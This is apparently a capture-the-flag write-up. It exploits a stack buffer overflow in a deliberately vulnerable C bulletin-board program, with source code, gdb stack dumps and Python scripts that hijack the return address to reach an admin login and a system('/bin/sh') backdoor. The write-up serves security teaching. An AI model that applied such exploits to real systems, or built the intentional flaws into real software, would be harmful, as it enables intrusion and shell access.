# Memory Corruption - Level 2

This the second level in the Memory Corruption challenges and comes with increased difficulty.

## Mission - Leet BBS

"Turns out, all the really elite hackers still use old-school bulletin board systems to stay in touch and trade warez. We've stolen the source code and binaries for one of the most popular underground BBS systems. Now we need you to get us a shell!"

## Static Analysis

From the mission statement we get two important pieces of information: 
- The objective is to obtain a shell
- We have the source code in `C` and the binary to reverse


```c
// gcc -g -no-pie -fno-stack-protector -I ../includes -o 03_level_3 03_level_3.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"
#include "visualize.h"

//
// Globals
//

int g_is_admin = 0;
int g_num_posts = 0;
char g_server_name[32] = {};

typedef struct post {
    char title[32];
    char body[128];
} Post;

Post g_posts[10] = {};

//
// Admin Code
//

void backdoor(int code, char* data)
{
    if (code == 1)
        system(data);
    if (code == 2)
        g_is_admin = 1;
    if (code == 3)
        exit(2);
}

void login_as_admin()
{
    char password[32] = {};

    puts("+------=[ " CGREEN "ADMIN LOGIN" CRESET " ]=------+");
    puts("| " CMAGENTA "Enter password to continue:" CRESET " |");
    puts("+-----------------------------+");

	// Wait for the user to enter the admin password
    fgets(password, sizeof(password), stdin);
	password[strcspn(password, "\n")] = 0;

    // Elevate the user to admin if they know the master password
    if (!strcmp(password, "l0ln0onewillguessth1s"))
    {
        g_is_admin = 1;
        puts("+---------------------------------------+");
        puts("| " CGREEN "Profile Status Upgraded To" CRESET " [10] Admin |");
        puts("+---------------------------------------+");
        press_enter();
        serve_bbs();
    }

    puts("> " CRED "INVALID PASSWORD" CRESET);
    exit(1);
}

void configure_server()
{
    puts("+---=[ " CGREEN "CONFIGURATION" CRESET " ]=---+");
    puts("| [1] Set server name     |");
    puts("| [2] Shutdown server     |");
    puts("| [3] Log out of admin    |");
    puts("+-------------------------+");

    // Prompt the user to pick a menu action
    printf("Enter choice: ");
    int choice = get_number();

    // Execute the user specified menu action
    if (choice == 1)
    {
        printf("Enter new server name: ");
        fgets(g_server_name, sizeof(g_server_name), stdin);
    }
    else if (choice == 2)
    {
        puts("Server shutting down...");
        sleep(3);
        exit(0);
    }
    else if (choice == 3)
    {
        g_is_admin = 0;
    }
    else
    {
        puts(CRED"Unknown command!"CRESET);
    }
}

//
// BBS Code
//

void create_post()
{
    if (g_num_posts >= 10)
    {
        puts("+-------=[ " CGREEN "Create Post" CRESET " ]=-------+");
        puts("| " CRED "You have made too many posts!" CRESET " |");
        puts("+-------------------------------+");
        press_enter();
        return;
    }

    // Prompt the user to enter a post title
    puts("+-------=[ " CGREEN "Create Post" CRESET " ]=-------+");
    puts("| Enter post title:             |");
    fgets(g_posts[g_num_posts].title, 32, stdin);

    // Strip newline from end of title
    unsigned int index = strcspn(g_posts[g_num_posts].title, "\n");
    g_posts[g_num_posts].title[index] = 0;

    // Prompt the user to enter text content for their post
    puts("| Enter post contents:          |");
    fgets(g_posts[g_num_posts].body, 128, stdin);
    puts("+-------------------------------+\n");

    g_num_posts++;
    puts("+---------------+");
    puts("| " CGREEN "Post created!" CRESET " |");
    puts("+---------------+");
    press_enter();
}

void serve_bbs()
{
    char buffer[128] = {};

    // Initialize BBS globals
    strcpy(g_server_name, "/\\ LEET BBS /\\\n");

    while (1)
    {
        puts("+-----=[ " CCYAN "MENU" CRESET " ]=-----+");
        puts("| " CYELLOW "Actions" CRESET "            |");
        puts("|  '-[1] " CGREEN "Create post" CRESET " |");
        puts("|  '-[2] " CRED "Exit" CRESET "        |");
        puts("| " CYELLOW "Current Posts" CRESET "      v");
        for (int i = 0; i < g_num_posts; i++) {
            printf("|  '-[%d] %s\n", i+3, g_posts[i].title);
        }
        puts("+--------------------^");

        // Prompt the user to pick a menu action
        printf("Enter choice: ");
        unsigned int choice = get_number();

        // Admin-only option (Hidden)
        if (choice == 0)
        {
            if (g_is_admin)
            {
                configure_server();
            }
            else
            {
                puts("\n\n"CRED"!! XXX ERROR XXX !!"CRESET);
                puts("[ Only an admin can configure the server ]");
                press_enter();
            }
        }

        // Create a new post
        else if (choice == 1)
        {
            create_post();
        }

        // Sign-off the BBS
        else if (choice == 2)
        {
            puts("Exiting!");
            break;
        }

        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }

        // Unknown menu selection...
        else
        {
        	puts(CRED"Unknown command!"CRESET);
			press_enter();
        }
    }

    printf("Thank you for visiting ");
    write(1, g_server_name, strlen(g_server_name));
}

void main()
{
	init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Stack Smashing, Level #2 - LEET BBS                     \n");
    printf("------------------------------------------------------------\n");
    serve_bbs();
}

```

There's a lot of code in this single source file, so I won't go over each part. If we look at the main function, we can get an idea of what the program does. In `main`, the banner is printed, then the `serve_bbs` function is called. That's as far as main goes. 


If we look at `serve_bbs` we can see there's a lot more happening:

```c
void serve_bbs()
{
    char buffer[128] = {};

    // Initialize BBS globals
    strcpy(g_server_name, "/\\ LEET BBS /\\\n");

    while (1)
    {
        puts("+-----=[ " CCYAN "MENU" CRESET " ]=-----+");
        puts("| " CYELLOW "Actions" CRESET "            |");
        puts("|  '-[1] " CGREEN "Create post" CRESET " |");
        puts("|  '-[2] " CRED "Exit" CRESET "        |");
        puts("| " CYELLOW "Current Posts" CRESET "      v");
        for (int i = 0; i < g_num_posts; i++) {
            printf("|  '-[%d] %s\n", i+3, g_posts[i].title);
        }
        puts("+--------------------^");

        // Prompt the user to pick a menu action
        printf("Enter choice: ");
        unsigned int choice = get_number();

        // Admin-only option (Hidden)
        if (choice == 0)
        {
            if (g_is_admin)
            {
                configure_server();
            }
            else
            {
                puts("\n\n"CRED"!! XXX ERROR XXX !!"CRESET);
                puts("[ Only an admin can configure the server ]");
                press_enter();
            }
        }

        // Create a new post
        else if (choice == 1)
        {
            create_post();
        }

        // Sign-off the BBS
        else if (choice == 2)
        {
            puts("Exiting!");
            break;
        }

        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }

        // Unknown menu selection...
        else
        {
        	puts(CRED"Unknown command!"CRESET);
			press_enter();
        }
    }

    printf("Thank you for visiting ");
    write(1, g_server_name, strlen(g_server_name));
}
```

The code above does the following:

- Initialize a 128 byte buffer to 0
- Copy the string "/\\ LEET BBS /\\\n" to the g_server_name variable
- Create a while loop letting the user pick one of 3 options
    - Option 1: Create a post (calls the `create_post` function)
    - Option 2: Exit the program
    - Option 0: If `g_is_admin` is true, call the `configure_server` function (allows user to configure admin settings)
- In the while loop you can also view posts by entering the numerical post number as an option, however this number choice must be less than the total number of posts + 2


## Finding the Bug

Now we have an idea of what will happen when we run the program, we can start analysing in more detail to find the bug. The strategy here is to look at all the areas where we can send input to the program, then see if the user input sinks down to any dangerous functions. 


The first place we can enter input is when we are presented with a choice: 

```c
// Prompt the user to pick a menu action 
printf("Enter choice: ");
unsigned int choice = get_number();
```
Our choice will go into the `choice` variable which is an unsigned int type. If you follow the function calls, this basically ends up in a scanf wrapper that ensures we only enter a number. We can move on from here as there is no issue with this. 


Next, we take a look at what happens when we view a post: 

```c
        // View a selected post
        else if (choice <= g_num_posts+2)
        {
            int num = choice-3;

			// Build the stylized message title
            strcpy(buffer, "\n=======] ");
            strcat(buffer, g_posts[num].title);
            strcat(buffer, " [=======\n");

            // Append the post body/content after the post title
            memcpy(buffer+strlen(buffer), g_posts[num].body, 128);

            // Print the stylized post
            puts(buffer);
			press_enter();
        }
```
The 128 byte buffer is used to save a stylised message title of a post that is created. The body of the post is then appended to the buffer immediately after the stylized message title. The key line to note here is: 

```c
memcpy(buffer+strlen(buffer), g_posts[num].body, 128);
```
This code will move the buffer array position to the end of stylised message title, then copy into the buffer the body of the post with a maximum size of 128 bytes. This is where we start to find a problem :smirk:


The buffer can only hold 128 bytes, so if the offset of the buffer is moved from index 0, for example it is moved to index 32, there would only be 96 bytes (minus 1 for null terminator) avaiable before the buffer overflows. Since the `memcpy` function is copying `g_posts[num].body` with an allowed size of 128 bytes, if the user input is 96 bytes or more, the 128 byte buffer will overflow. 


To test this out we can run the binary in the debugger, then inspect the stack before and after the call to `memcpy`.

We place a breakpoint on the call to memcpy in the serve_bbs function:
```gdb
break *0x4010f7
```
Next, we run the binary and choose to create a post.

```gdb
wdb> start
Started '03_level_2'
Breakpoint 1: 0x40115f, main+0
wdb> contin
------------------------------------------------------------
--[ Stack Smashing, Level #2 - LEET BBS
------------------------------------------------------------
+-----=[ MENU ]=-----+
| Actions            |
|  '-[1] Create post |
|  '-[2] Exit        |
| Current Posts      v
+--------------------^
Enter choice:
>>

```

Before we send any input, we should think about how the stack is likely layed out and what sizes are already in use. Recall that in the x86-64 calling convention, the first two items placed before the beginning of the stack is the return address and the old rbp. This will take up 16 bytes to begin with. If we look at the setup of the stack in the disassembly for `serve_bbs`, we can see how many bytes are allocated: 

```asm
0x400ebc:  push    rbp
0x400ebd:  mov     rbp, rsp
0x400ec0:  push    rbx
0x400ec1:  sub     rsp, 0x98
0x400ec8:  lea     rdx, [rbp-0xa0]
```
As mentioned above, first: 
- rbp is pushed to the stack before our frame pointer begins. 
- Next the `mov rbp, rsp` instruction moves the stack pointer address into rbp to begin the stack frame for `serve_bbs`. 
- Then, `push rbx` will push another 8 byte value to the stack.
- Finally, `sub rsp,  0x98` will subtract another 152 bytes from the current location of the stack pointer (rbp-0x8). 

This means the stack is 160 bytes in size (0xa0). The next thing we need to consider is the size of the post title buffer `32 bytes` and the size of the stylized message string `20 bytes`. Together this presents 52 bytes used up in the buffer, which we substract from 160, leaving `108 bytes`. If we send 30 'A's (accounting for a newline added by fgets and \0 null terminating character), this will add up to 32 bytes for the title. We can then send 108 'B's, which should take us to the beginning of the stack just before the saved `rbp` and return address. 


```gdb
Enter choice:
>> 1
+-------=[ Create Post ]=-------+
| Enter post title:             |
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
| Enter post contents:          |
>> BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBB
+-------------------------------+

+---------------+
| Post created! |
+---------------+
Press enter to continue...
```

When we press enter to continue, we are back at the menu prompt. Recall that the `memcpy` operation happens when a post is viewed, so we will need to view a post to trigger the bug. Enter `3` as the choice then when our breakpoint is hit, we inspect the stack before the memcpy operation.

```gdb
Enter choice: 
>> 3
Breakpoint 0: 0x4010f7, serve_bbs+571
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x0000000000000a3d    0x0000000000000000
0x7fffffffed60: 0x0000000000000000    0x0000000000000000
0x7fffffffed70: 0x0000000000000000    0x0000000000000000
0x7fffffffed80: 0x0000000000000000    0x0000000000000000
0x7fffffffed90: 0x0000000000000000    0x0000000000000000
0x7fffffffeda0: 0x0000000000401738    0x0000000100000003
0x7fffffffedb0: 0x0000000000000000    0x0000000000000000
0x7fffffffedc0: 0x00007fffffffedd0    0x0000000000401195
```
From the output, we already see the 'A's (0x41) that represent our title, followed by the string characters for the end of the stylized message title. This is followed space reserved for the remaining buffer allocation, until `0x7fffffffed98`. The old rbp address pushed to the stack is in `0x7fffffffedc0` and has the value `0x00007fffffffedd0`. Lastly, the return address is in `0x7fffffffedc8` and has the value `0x0000000000401195`


We'll type `ni` to allow the memcpy to complete, then review the stack again:

```gdb
wdb> ni
0x4010fc in serve_bbs ()
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x4242424242420a3d    0x4242424242424242
0x7fffffffed60: 0x4242424242424242    0x4242424242424242
0x7fffffffed70: 0x4242424242424242    0x4242424242424242
0x7fffffffed80: 0x4242424242424242    0x4242424242424242
0x7fffffffed90: 0x4242424242424242    0x4242424242424242
0x7fffffffeda0: 0x4242424242424242    0x4242424242424242
0x7fffffffedb0: 0x4242424242424242    0x000a424242424242
0x7fffffffedc0: 0x0000000000000000    0x0000000000000000
```

As expected, the input has filled out the buffer and overflowed, stopping just before the old rbp and return address. When memcpy operates, it zeros out the buffer it is being copied into, so the `0x7fffffffedc0` and `0x7fffffffedc8` memory locations appear to hold 0's instead of the addresses. 
Now we know where the return address is and how many bytes we need to send, we can start to redirect program execution by replacing the return address of the `server_bbs` function to one of our choosing, `login_as_admin` (0x400bce).



### Python script to login as admin:

```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter choice')
p.sendline('1')
#p.readuntil('Enter post title:')
p.sendline('A' * 30)
#p.readuntil('Enter post contents:')
p.sendline('B' * 110 + 'C' * 7 + '\0' + '\xce\x0b\x40\x00\x00\x00\x00\x00' )


p.interactive()
```
After sending this, we can check the stack and verify we have overwritten the address:

```gdb
wdb> ni
0x4010fc in serve_bbs ()
wdb> x/22gx $rsp
0x7fffffffed20: 0x3d3d3d3d3d3d3d0a    0x414141414141205d
0x7fffffffed30: 0x4141414141414141    0x4141414141414141
0x7fffffffed40: 0x4141414141414141    0x3d3d3d3d3d3d5b20
0x7fffffffed50: 0x4242424242420a3d    0x4242424242424242
0x7fffffffed60: 0x4242424242424242    0x4242424242424242
0x7fffffffed70: 0x4242424242424242    0x4242424242424242
0x7fffffffed80: 0x4242424242424242    0x4242424242424242
0x7fffffffed90: 0x4242424242424242    0x4242424242424242
0x7fffffffeda0: 0x4242424242424242    0x4242424242424242
0x7fffffffedb0: 0x4242424242424242    0x4242424242424242
0x7fffffffedc0: 0x0043434343434343    0x0000000000400bce
```
Once we press continue, we need to exit the program to cause the program to return, but this time we get redirected to the admin login prompt:

```gdb
Enter choice:
>> 2
Exiting!
Thank you for visiting /\ LEET BBS /\
+------=[ ADMIN LOGIN ]=------+
| Enter password to continue: |
+-----------------------------+
>> l0ln0onewillguessth1s
+---------------------------------------+
| Profile Status Upgraded To [10] Admin |
+---------------------------------------+
Press enter to continue...
```
# Solving the Challenge

We have made a big step forward in getting code exeution through a write primitive to allow us to bypass the restriction to acess the admin page. To solve the challenge however, we need to obtain a shell and capture the flag. 


Recall back in the code review earlier, there was a function called `backdoor`:

```c
void backdoor(int code, char* data)
{
    if (code == 1)
        system(data);
    if (code == 2)
        g_is_admin = 1;
    if (code == 3)
        exit(2);
}
```

The important thing to note in this funtion is that if it is called with the `code` argument set to `1`, a call to the `system` function is made with the second argument `data` which is a pointer to some string characters. The problem here is that the backdoor function is not called in the `login_as_admin` function, or any others in fact. So, to get to the backdoor function, we'll have to use the same buffer overflow vulnerability, and return to the address of the backdoor function.  


To get an idea of what happens to the arguments, registers and memory in the backdoor function at the assembly level, we can review the disassembly:

```asm
0x400b8a:  push    rbp
0x400b8b:  mov     rbp, rsp
0x400b8e:  sub     rsp, 0x10
0x400b92:  mov     dword [rbp-0x4], edi
0x400b95:  mov     qword [rbp-0x10], rsi
0x400b99:  cmp     dword [rbp-0x4], 0x1
0x400b9d:  jne     0x400bab
0x400b9f:  mov     rax, qword [rbp-0x10]
0x400ba3:  mov     rdi, rax
0x400ba6:  call    system
0x400bab:  cmp     dword [rbp-0x4], 0x2
0x400baf:  jne     0x400bbb
0x400bb1:  mov     dword [rel g_is_admin], 0x1
0x400bbb:  cmp     dword [rbp-0x4], 0x3
0x400bbf:  jne     0x400bcb
0x400bc1:  mov     edi, 0x2
0x400bc6:  call    exit
0x400bcb:  nop
0x400bcc:  leave
0x400bcd:  retn
```

The key parts here are: 

- The first set of instructions makes a comparision with `rbp-0x4` and `0x1` (This checks the code argument was set to 1)
- The call to system uses `rbp-0x10` as an argument. This should be a pointer to a char array.

When I first saw this, I modified the python script to set `rbp-0x4` in the orginal exploit to be 0x1. This is just 8 bytes before the return address but only the first 4 would need to be set. Secondly I used some of the address space further up in the exploit (where the B's were being written) and added the charaters "/bin/sh" followed by a null (10 bytes in total). After this I added the address of where I put the characters into `rbp-0x10` which would be 16 bytes after the beginning of the stack. Finally, I added replaced the return address for the login_as_admin function with the address of the backdoor function.


Sadly, the above trick did no work. When I did this, a popup message came up to show that the call the `system` or `exceve` was possibly receiving incorrect arguments. This prompted me to check what was actually being passed in as a string in `rbp-0x10` before making the system call. Let's take a look what happens in the debugger when we break on `backdoor`:


First we check what is in rbp-0x4:

```gdb
wdb> b * 0x400b8a
Breakpoint will be set at 0x400b8a
Started '03_level_2'
Breakpoint 1: 0x400b8a, backdoor+0
wdb> ni
0x400b8b in backdoor ()
wdb> ni
0x400b8e in backdoor ()
wdb> ni
0x400b92 in backdoor ()
wdb> ni
0x400b95 in backdoor ()
wdb> x/gx $rbp-0x4
0x7fffffffed9c: 0x4646464600000001
```
This is good, the first argument to backdoor is saved in `rbp-0x4` and this appears to automatically be set to 1 (for the first 4 bytes since it's taken from edi). Next we can check what happens after `rsi` is moved into `rbp-0x10`:

```gdb
wdb> ni
0x400b99 in backdoor ()
wdb> x/gx $rbp-0x10
0x7fffffffed90: 0x0000000000602160
```
This appears to point to a referenced address 0x602160. If we examine the contents of memory at that location as a string, we can see what characters were stored there:

```gdb
wdb> x/s 0x602160
0x602160: "/\ LEET BBS /\\n"
```

This makes sense now. The backdoor function is receiving the `server_name` global variable as a second argument, and this is being input into the `system` call as it's first argument. From this output, it appears whatever I tried to set previously in `rbp-0x10` is being overwritten between calls :expressionless:


To solve this problem, it looks like we need to overwrite the server name with our new admin access and set this to "/bin/sh". After the server name has been set, we'll need to trigger the bug in the same way a second time, but this time overwriting the return address with the address of `backdoor` which is `0x400b8a` :grin: To automate the process, we update the python script to account for pressing enter, changing the server name, then creating another post triggering the buffer overflow and supplying a return address to `backdoor`.

## Final Exploit Script

```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter choice')
p.sendline('1')
#p.readuntil('Enter post title:')
p.sendline('A' * 30)
#p.readuntil('Enter post contents:')
p.sendline('B' * 110 + 'C' * 7 + '\0' + '\xce\x0b\x40\x00\x00\x00\x00\x00' )
#p.readuntil('Enter choice')
p.sendline('')
p.sendline('3')
p.sendline('')
p.sendline('2')
p.sendline('l0ln0onewillguessth1s')
p.sendline('')
p.sendline('0')
p.sendline('1')
p.sendline('"/bin/sh"')
p.sendline('1')
p.sendline('D' * 30)
p.sendline('E' * 110 + 'F' * 7 + '\0' + '\x8a\x0b\x40\x00\x00\x00\x00\x00' )
p.sendline('')
p.sendline('4')
p.sendline('')
p.sendline('2')
p.interactive()
```
Finally, we see:

```gdb
Enter choice: Exiting!
Thank you for visiting "/bin/sh"
$
```

